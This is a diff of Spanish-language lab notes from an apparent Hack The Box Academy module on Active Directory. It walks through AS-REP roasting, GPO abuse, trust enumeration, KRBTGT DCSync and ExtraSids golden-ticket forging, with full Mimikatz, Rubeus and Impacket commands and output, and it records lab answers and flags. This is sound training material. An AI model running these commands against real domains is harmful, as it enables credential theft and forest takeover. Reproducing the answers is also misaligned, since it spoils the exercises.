@@ -25,6 +25,22 @@
 	- [[#PrintNightmare]]
 	- [[#PetitPotam (MS-EFSRPC)]]
 - [[#Misconfiguraciones variadas]]
+	- [[#Credenciales en SMB Shares y scripts SYSVOL]]
+	- [[#GPO Abuse]]
+- [[# Fundamentos de las confianzas de dominio]]
+	- [[#Visión general de las confianzas de dominio]]
+	- [[#Enumerando relaciones de confianza]]
+- [[#Atacando confianzas de dominio - Confianzas hijo → padre (Windows)]]
+	- [[#Obteniendo el hash NT de la cuenta KRBTGT usando Mimikatz]]
+	- [[#Creando un Golden Ticket con Mimikatz]]
+	- [[#ExtraSids Attack - Rubeus]]
+		- [[#Creando un Golden Ticket usando Rubeus]]
+- [[#Atacando confianzas de dominio - Confianzas hijo → padre (Linux)]]
+	- [[#Realizando un DCSync con `secretsdump.py`]]
+	- [[#Realizando fuerza bruta de SIDs usando `lookupsid.py`]]
+	- [[#Obteniendo el SID del dominio y adjuntando el RID del grupo Enterprise Admins]]
+	- [[#Construyendo un Golden Ticket usando `ticketer.py`]]
+	- [[#Lanzando el ataque con `raiseChild.py`]]
 
 Antes de comenzar cualquier prueba de penetración, **realizar una fase de reconocimiento externo** puede ser muy beneficioso. Esta fase cumple varias funciones clave:
 
@@ -4093,7 +4109,7 @@ mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
 
 ##### _Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.
 
-> **Respuesta**: 
+> **Respuesta**: D0ntSl@ckonN0P@c!
 
 Primero, nos conectamos por SSH a la máquina de HTB. Una vez dentro, lo primero será comprobar si el sistema es vulnerable. Para ello, lanzamos el escáner ubicado en `/opt/NoPac/scanner.py` con las credenciales obtenidas previamente (`forend:Klmcargo2`) a la IP del DC (172.16.5.5)
 
@@ -4388,3 +4404,663 @@ PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 
 Y luego, con el módulo `18200`, descifrar el hash con Hashcat.
 
+##### Obteniendo el AS-REP usando Kerbrute
+
+```shell
+[!bash!]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop
+
+2022/04/01 13:14:17 >  Using KDC(s):
+2022/04/01 13:14:17 >  	172.16.5.5:88
+
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
+2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda...
+
+<SNIP>
+```
+
+Con una lista de usuarios válidos, **Get-NPUsers.py** (Impacket) permite identificar cuentas sin **preautenticación Kerberos**, obtener sus **AS-REP** para crackeo offline y, si no se logran romper, reportarlo igualmente como hallazgo de riesgo bajo.
+
+```shell
+[!bash!]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+
+[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d51...
+[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+### GPO Abuse
+
+Las **Group Policy Objects (GPOs)** pueden fortalecer o comprometer un dominio. Si un atacante obtiene control sobre una GPO por una mala ACL, puede usarla para moverse lateralmente, escalar privilegios o mantener persistencia. Errores comunes permiten añadir privilegios, crear administradores locales o tareas programadas. Se pueden auditar y enumerar con **PowerView**, **BloodHound**, **group3r**, **ADRecon** o **PingCastle**.
+
+##### Enumerando GPOs con PowerView
+
+```powershell
+PS C:\htb> Get-DomainGPO |select displayname
+```
+
+Esto permite identificar medidas de seguridad activas (bloqueo de cmd.exe, políticas de contraseñas separadas, uso de autologon con posibles credenciales visibles o presencia de AD CS). Si el equipo tiene las herramientas de administración de directivas instaladas, puede usarse **Get-GPO** para enumerar lo mismo.
+
+##### Enumerando GPOs con un cmdlet
+
+```powershell
+PS C:\htb> Get-GPO -All | Select DisplayName
+```
+
+##### Enumeración de permisos de GPO para usuarios del dominio
+
+```powershell
+PS C:\htb> $sid=Convert-NameToSid "Domain Users"
+PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID             :
+ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
+                        WriteOwner
+BinaryLength          : 36
+AceQualifier          : AccessAllowed
+IsCallback            : False
+OpaqueLength          : 0
+AccessMask            : 983095
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
+AceType               : AccessAllowed
+AceFlags              : ObjectInherit, ContainerInherit
+IsInherited           : False
+InheritanceFlags      : ContainerInherit, ObjectInherit
+PropagationFlags      : None
+AuditFlags            : None
+```
+
+Aquí podemos ver que el grupo **Domain Users** tiene varios permisos sobre una GPO, como **WriteProperty** y **WriteDacl**, los cuales podríamos aprovechar para obtener control total sobre la GPO y ejecutar distintos ataques que se aplicarían a todos los usuarios y equipos de las UO donde esté vinculada. Podemos usar el **GUID** de la GPO junto con **Get-GPO** para ver su nombre visible.
+
+##### Convirtiendo GPO GUID a Nombre
+
+```powershell-session
+PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+
+DisplayName      : Disconnect Idle RDP
+DomainName       : INLANEFREIGHT.LOCAL
+Owner            : INLANEFREIGHT\Domain Admins
+Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
+```
+
+Al revisar en **BloodHound**, podemos ver que el grupo **Domain Users** tiene varios permisos sobre la GPO **Disconnect Idle RDP**, lo que podría aprovecharse para obtener control total del objeto.
+
+![[Pasted image 20251118074751.png | 800]]
+
+Si seleccionamos la GPO en BloodHound y bajamos hacia `Affected Objects` en la pestaña `Node Info`, podemos ver que esta GPO está aplicada a un OU, que contiene 4 objetos ordenador:
+
+![[Pasted image 20251118074915.png]]
+
+Podríamos usar una herramienta como **SharpGPOAbuse** para explotar esta mala configuración de GPO realizando acciones como agregar nuestro usuario al grupo de administradores locales, crear una tarea programada que nos dé una _reverse shell_ o configurar un script de inicio malicioso. Sin embargo, hay que actuar con cuidado, ya que los cambios afectan a todos los equipos de la OU vinculada; por ejemplo, no sería prudente añadirse como administrador local en mil equipos a la vez. Algunas opciones del programa permiten limitar el ataque a un usuario o host concreto. Los equipos mostrados en el ejemplo no son vulnerables, y los ataques a GPO se tratarán con más detalle en otro módulo.
+
+##### _Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y"._
+
+> **Respuesta**: ygroce
+
+```powershell
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+
+##### _Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer._
+
+> **Respuesta**: Pass@word
+
+En primer lugar, habiendo importado previamente PowerView, obtenemos la lista de los usuarios que no tienen el Pre-Auth activado:
+
+```powershell
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+
+Nos dará esta lista:
+
+![[Pasted image 20251118080727.png]]
+
+Posteriormente, utilizamos Rubeus.exe con asreproast para obtener el hash del usuario ygroce:
+
+```powershell
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+
+![[Pasted image 20251118081041.png]]
+
+Desciframos el hash con hashcat:
+
+```bash
+hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+
+...:Pass@word
+  
+Session..........: hashcat
+Status...........: Cracked
+```
+
+# Fundamentos de las confianzas de dominio
+
+##### Escenario
+
+Muchas organizaciones grandes adquieren con el tiempo nuevas empresas y las integran en su estructura. Una forma sencilla de hacerlo es establecer una **relación de confianza entre dominios** (_domain trust_) con el nuevo dominio. Esto evita tener que migrar todos los objetos existentes y acelera la integración. Sin embargo, estas confianzas también pueden introducir **debilidades** si no se gestionan correctamente: un subdominio con una vulnerabilidad puede servirnos como vía rápida para acceder al dominio principal. Las empresas también pueden establecer confianzas con **proveedores de servicios (MSP)**, **clientes** u **otras unidades de negocio** (por ejemplo, una delegación en otra región). A continuación, veremos con más detalle cómo funcionan las confianzas de dominio y cómo es posible **abusar de su funcionalidad interna** durante una auditoría o evaluación de seguridad.
+
+### Visión general de las confianzas de dominio
+
+Una **confianza (trust)** se utiliza para establecer autenticación entre **bosques (forest-forest)** o **dominios (domain-domain)**, permitiendo que los usuarios accedan a recursos o realicen tareas administrativas en otro dominio distinto de aquel donde reside su cuenta. La confianza enlaza los sistemas de autenticación de dos dominios y puede ser **unidireccional** o **bidireccional**.  
+Una organización puede crear varios tipos de confianza:
+
+- **Parent-child (padre-hijo):** entre dos o más dominios del mismo bosque. La confianza es bidireccional y transitiva; por ejemplo, los usuarios de _corp.inlanefreight.local_ pueden autenticarse en _inlanefreight.local_ y viceversa.    
+- **Cross-link:** confianza entre dominios hijo para acelerar la autenticación.    
+- **External (externa):** no transitiva, entre dominios de bosques distintos que no están unidos por una forest trust; utiliza **SID filtering** para limitar autenticaciones de dominios no confiables.    
+- **Tree-root:** confianza bidireccional y transitiva entre el dominio raíz del bosque y un nuevo dominio raíz de árbol, creada automáticamente al agregar un nuevo árbol dentro del bosque.    
+- **Forest (de bosque):** confianza transitiva entre los dominios raíz de dos bosques.    
+- **ESAE:** bosque bastión (_bastion forest_) empleado para la administración segura de Active Directory.
+
+Al establecer una **confianza**, ciertos parámetros pueden ajustarse según las necesidades del negocio. Las confianzas pueden ser **transitivas** o **no transitivas**.
+
+Una **confianza transitiva** extiende la confianza a los objetos que el dominio hijo confía. Por ejemplo, si el **Dominio A** confía en el **Dominio B**, y el **Dominio B** tiene una confianza transitiva con el **Dominio C**, entonces el **Dominio A** también confiará automáticamente en el **Dominio C**.
+
+En una **confianza no transitiva**, solo se confía directamente en el dominio especificado, sin extender la confianza a otros dominios intermedios.
+
+![[Pasted image 20251118082015.png | 800]]
+
+##### Tabla de confianza
+
+| Transitivo                                                                     | No transitivo                                       |
+| ------------------------------------------------------------------------------ | --------------------------------------------------- |
+| Compartido, 1 a muchos                                                         | Confianza directa                                   |
+| La confianza es compartida con cualquiera en el bosque                         | No se extiende al siguiente nivel de dominios hijos |
+| Bosque, árbol-raíz, padre-hijo, y confianzas de enlace cruzado son transitivas | Típico en confianzas externas o personalizadas      |
+Las confianzas pueden ser **unidireccionales** (solo un dominio accede al otro) o **bidireccionales** (ambos acceden entre sí). Si se configuran mal, pueden abrir **rutas de ataque críticas**, especialmente tras fusiones o adquisiciones donde el dominio adquirido tiene menor seguridad. Un atacante podría comprometer un dominio secundario y, desde ahí, obtener acceso administrativo al principal. Por eso, es clave evaluar la seguridad antes de establecer cualquier relación de confianza.
+
+![[Pasted image 20251118083832.png | 700]]
+
+### Enumerando relaciones de confianza
+
+Podemos usar el cmdlet `GetAD-Trust` para enumerar relaciones de confianza en el dominio. Esto es especialmente de ayuda si estamos limitados a usar herramientas built-in.
+
+##### Usando Get-ADTrust
+
+```powershell
+PS C:\htb> Import-Module activedirectory
+PS C:\htb> Get-ADTrust -Filter *
+```
+
+El dominio **INLANEFREIGHT.LOCAL** tiene dos confianzas: una con su subdominio **LOGISTICS.INLANEFREIGHT.LOCAL** y otra con **FREIGHTLOGISTICS.LOCAL**, esta última de tipo _forest_ o _external_, ambas **bidireccionales**, permitiendo autenticación en ambos sentidos. Esto es clave para auditorías, ya que sin autenticación cruzada no hay enumeración posible. Las relaciones de confianza pueden verse con **PowerView (Get-DomainTrust)**, **BloodHound** o el módulo de PowerShell de AD.
+
+##### Comprobar confianzas existentes usando Get-DomainTrust
+
+```powershell-session
+PS C:\htb> Get-DomainTrust 
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+```
+
+**PowerView** permite mapear las confianzas de dominio y mostrar su tipo (padre/hijo, externa o de bosque) y dirección (unidireccional o bidireccional). Esta información resulta útil una vez obtenido un punto de acceso para planificar la expansión del compromiso en el entorno.
+
+##### Usando Get-DomainTrustMapping
+
+```powershell-session
+PS C:\htb> Get-DomainTrustMapping
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+...SNIP...
+```
+
+Desde aquí, podríamos comenzar a enumerar a través de las confianzas. Por ejemplo, comprobar todos los usuarios en el dominio hijo:
+
+##### Comprobando usuarios en el dominio hijo usando Get-DomainUser
+
+```powershell
+PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+htb-student_adm
+Administrator
+Guest
+lab_adm
+krbtgt
+```
+
+Otra herramienta útil es **netdom**. Con el subcomando `netdom query`, podemos obtener información del dominio, como la lista de equipos, servidores y **relaciones de confianza** configuradas.
+
+```cmd
+C:\htb> netdom query /domain:inlanefreight.local trust
+Direction Trusted\Trusting domain                         Trust type
+========= =======================                         ==========
+
+<->       LOGISTICS.INLANEFREIGHT.LOCAL                   Direct
+ Not found 
+
+<->       FREIGHTLOGISTICS.LOCAL                          Direct
+ Not found
+
+The command completed successfully.
+```
+
+**Usando netdom para comprobar controladores de dominio**
+
+```cmd-session
+C:\htb> netdom query /domain:inlanefreight.local dc
+List of domain controllers with accounts in the domain:
+
+ACADEMY-EA-DC01
+The command completed successfully.
+```
+
+**Usando netdom para comprobar servidores y workstations**
+
+```cmd-session
+C:\htb> netdom query /domain:inlanefreight.local workstation
+List of workstations with accounts in the domain:
+
+ACADEMY-EA-MS01
+ACADEMY-EA-MX01      ( Workstation or Server )
+...SNIP...
+```
+
+También podemos usar **BloodHound** para visualizar las relaciones de confianza mediante la consulta predefinida **Map Domain Trusts**, donde se muestra claramente la existencia de dos confianzas bidireccionales.
+
+##### _What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)_
+
+> **Respuesta**: LOGISTICS.INLANEFREIGHT.LOCAL
+
+![[Pasted image 20251118090134.png]]
+
+Lo tenemos justo ahí
+##### _What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?_
+
+> **Respuesta**: FREIGHTLOGISTICS.LOCAL
+
+![[Pasted image 20251118090701.png]]
+##### _What direction is this trust?_
+
+> **Respuesta**: BiDirectional
+
+# Atacando confianzas de dominio - Confianzas hijo → padre (Windows)
+
+##### Introducción a SID History
+
+El atributo **sidHistory** permite que, tras migrar un usuario a otro dominio, siga accediendo a los recursos del dominio original. Un atacante puede abusar de esto con **Mimikatz**, inyectando el SID de un **Domain Admin** en la _sidHistory_ de una cuenta bajo su control. Al iniciar sesión, el token del usuario incluirá ese SID, otorgándole privilegios de administrador, permitiendo ejecutar **DCSync** o crear **Golden Tickets** para mantener acceso persistente.
+##### ExtraSids Attack - Mimikatz
+
+El **ataque ExtraSIDs** permite comprometer el dominio padre tras vulnerar el hijo, aprovechando que dentro del mismo bosque no hay **SID Filtering**. Con **Mimikatz**, se modifica el atributo _sidHistory_ de una cuenta del dominio hijo para añadir el **SID de Enterprise Admins** del dominio raíz, obteniendo acceso total al bosque sin pertenecer realmente al grupo.  
+Para ello se necesitan el **hash KRBTGT**, el **SID del dominio hijo**, el **usuario objetivo** (real o no), el **FQDN del dominio hijo** y el **SID de Enterprise Admins**. Con el hash KRBTGT —obtenido mediante **DCSync** tras comprometer el dominio hijo— se puede crear un **Golden Ticket** y tomar control del dominio padre.
+
+##### Obteniendo el hash NT de la cuenta KRBTGT usando Mimikatz
+
+```powershell
+PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'LOGISTICS\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/1/2021 11:21:33 AM
+Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9d765b482771505cbe97411065964d5f
+    ntlm- 0: 9d765b482771505cbe97411065964d5f
+    lm  - 0: 69df324191d4a80f0ed100c10f20561e
+```
+
+Podemos usar la función `Get-DomainSID` para obtener el SID para el dominio hijo, pero esto también es visible con Mimikatz como se puede ver arriba.
+##### Usando Get-DomainSID
+
+```powershell-session
+PS C:\htb> Get-DomainSID
+
+S-1-5-21-2806153819-209893948-922872689
+```
+
+A continuación, podemos usar **Get-DomainGroup** de **PowerView** para obtener el **SID** del grupo **Enterprise Admins** en el dominio padre. También puede hacerse con PowerShell usando:  
+`Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.
+
+```powershell
+PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+distinguishedname                                       objectsid                                    
+-----------------                                       ---------                                    
+CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
+```
+
+En este punto tenemos los siguientes datos:
+
+- **Hash KRBTGT** del dominio hijo: `9d765b482771505cbe97411065964d5f`    
+- **SID** del dominio hijo: `S-1-5-21-2806153819-209893948-922872689`    
+- **Usuario objetivo** (puede no existir): `hacker`    
+- **FQDN** del dominio hijo: `LOGISTICS.INLANEFREIGHT.LOCAL`    
+- **SID** del grupo **Enterprise Admins** del dominio raíz: `S-1-5-21-3842939050-3880317879-2865463114-519`    
+
+Antes del ataque, se confirma que **no hay acceso** al sistema de archivos del **controlador de dominio padre**.
+
+```powershell-session
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls : Access is denied
+```
+
+Usando Mimikatz y los datos listados arriba podemos crear un Golden Ticket para acceder a todos los recursos del dominio padre
+##### Creando un Golden Ticket con Mimikatz
+
+```powershell
+PS C:\htb> mimikatz.exe
+
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+User      : hacker
+Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+SID       : S-1-5-21-2806153819-209893948-922872689
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
+ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
+Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
+```
+
+Podemos confirmar que el ticket Kerberos para el usuario `hacker` (que no existe) está residiendo en memoria utilizando `klist`. Desde aquí, es posible acceder a cualquier recurso dentro del dominio padre, y podríamos comprometerlo de diferentes formas, como listar todo el directorio C:\ del DC.
+### ExtraSids Attack - Rubeus
+
+También podemos realizar este ataque usando Rubeus. Primero, igual que antes, debemos confirmar que no podemos acceder al sistema de ficheros del DC
+
+```powershell-session
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls : Access is denied
+At line:1 char:1
++ ls \\academy-ea-dc01.inlanefreight.local\c$
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
+   sException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+	
+```
+
+Después, formularemos nuestro comando Rubeus usando la información que obtuvimos más arriba. La flag `/rc4` es el hash NT de la cuenta KRBTGT. La flag `/sids` le dirá a Rubeus que cree nuestro Golden Ticket dándonos los mismos privilegios que los miembros del grupo Enterprise Admins en el dominio padre.
+
+##### Creando un Golden Ticket usando Rubeus
+
+```powershell
+PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+..SNIP..
+
+[+] Ticket successfully imported!
+```
+
+> `/ptt` indica Pass the Ticket
+
+Igual que antes, podemos confirmar que el ticket está en memoria usando el comando `klist`
+
+##### Realizando un ataque DCSync
+
+```powershell
+PS C:\Tools\mimikatz\x64> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\lab_adm' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : lab_adm
+
+** SAM ACCOUNT **
+
+SAM Username         : lab_adm
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 2/27/2022 10:53:21 PM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
+Object Relative ID   : 1001
+
+Credentials:
+  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
+    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
+```
+
+Cuando trabajamos con varios dominios y el dominio objetivo **no coincide** con el del usuario, debemos **especificar el dominio exacto** al realizar la operación **DCSync** sobre el controlador de dominio deseado.
+
+```powershell
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+```
+
+##### _What is the SID of the child domain?
+
+> **Respuesta:** S-1-5-21-2806153819-209893948-922872689
+
+Simplemente desde PowerShell:
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainSID
+```
+
+Y nos dará el SID.
+##### _What is the SID of the Enterprise Admins group in the root domain?_
+
+> **Respuesta:** S-1-5-21-3842939050-3880317879-2865463114-519
+
+```powershell
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+##### _Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain_
+
+> **Respuesta:** f@ll1ng_l1k3_d0m1no3$
+
+Primero obtenemos el hash de la cuenta KRBTGT. 
+
+```powershell
+.\mimikatz.exe
+lsadump::dcsync /user:LOGISTICS\krbtgt
+```
+
+Una vez obtenemos el hash, el SID del grupo de administradores Enterprise, y el SID del dominio hijo, podemos crear el golden ticket
+
+```powershell
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+```
+
+![[Pasted image 20251118134954.png]]
+
+Al tenerlo en memoria podemos obtener la flag fácilmente.
+
+```bash
+cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
+```
+# Atacando confianzas de dominio - Confianzas hijo → padre (Linux)
+
+También puede realizarse el ataque desde un host Linux, reuniendo los mismos datos: **hash KRBTGT**, **SID del dominio hijo**, **usuario objetivo**, **FQDN** y **SID de Enterprise Admins** del dominio raíz.  
+Con control total del dominio hijo (_LOGISTICS.INLANEFREIGHT.LOCAL_), se usa **secretsdump.py** para ejecutar **DCSync** y obtener el **hash NTLM** de la cuenta **KRBTGT**.
+
+##### Realizando un DCSync con `secretsdump.py`
+
+```shell
+$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+krbtgt:des-cbc-md5:fee04c3d026d7538
+[*] Cleaning up...
+```
+
+Luego podemos usar **lookupsid.py** de **Impacket** para forzar SIDs y obtener el **SID del dominio hijo**. Indicando la IP del **controlador de dominio** como destino, la herramienta devuelve el SID del dominio y los **RIDs** de usuarios y grupos. Por ejemplo, el usuario _lab_adm_ tendría el SID **S-1-5-21-2806153819-209893948-922872689-1001**.
+
+##### Realizando fuerza bruta de SIDs usando `lookupsid.py`
+
+```shell
+$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 172.16.5.240
+[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+Podemos filtrar el ruido enviando la salida del comando a **grep** y mostrando solo el **SID del dominio**. Para buscar el SID del dominio:
+
+```shell
+$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+A continuación, podemos volver a ejecutar el comando apuntando al **controlador de dominio INLANEFREIGHT (DC01)** en **172.16.5.5**, obtener el **SID del dominio** (`S-1-5-21-3842939050-3880317879-2865463114`) y añadirle el **RID** del grupo **Enterprise Admins**.  
+
+##### Obteniendo el SID del dominio y adjuntando el RID del grupo Enterprise Admins
+
+```shell
+amr251@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
